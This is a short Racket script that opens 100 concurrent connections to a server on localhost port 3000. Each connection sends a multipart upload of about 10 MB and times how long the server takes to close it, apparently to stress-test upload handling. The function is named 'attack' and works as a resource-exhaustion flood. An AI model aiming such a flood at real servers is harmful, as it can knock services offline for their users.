#lang racket

(define s (make-string 1024 #\0))

(define (attack)
  (define-values (in out)
    (tcp-connect "127.0.0.1" 3000))

  (parameterize ([current-output-port out])
    (display "POST / HTTP/1.1\r\n")
    (display "Content-Type: multipart/form-data; boundary=abc\r\n")
    (display "\r\n")
    (display "--abc\r\n")
    (display "Content-Disposition: multipart/form-data; filename=\"data\"; name=\"file\"\r\n")
    (display "\r\n")
    (flush-output)
    (for ([_ (in-range (* 10 1024))])
      (display s))
    (display "\r\n")
    (display "--abc--\r\n")
    (flush-output))

  (define st (current-seconds))
  (sync in)
  (printf "closed after ~as\n" (- (current-seconds) st)))

(define threads
  (for/list ([_ (in-range 100)])
    (thread attack)))

(for ([t (in-list threads)]
      [i (in-naturals)])
  (sync t)
  (printf "~a done\n" i))
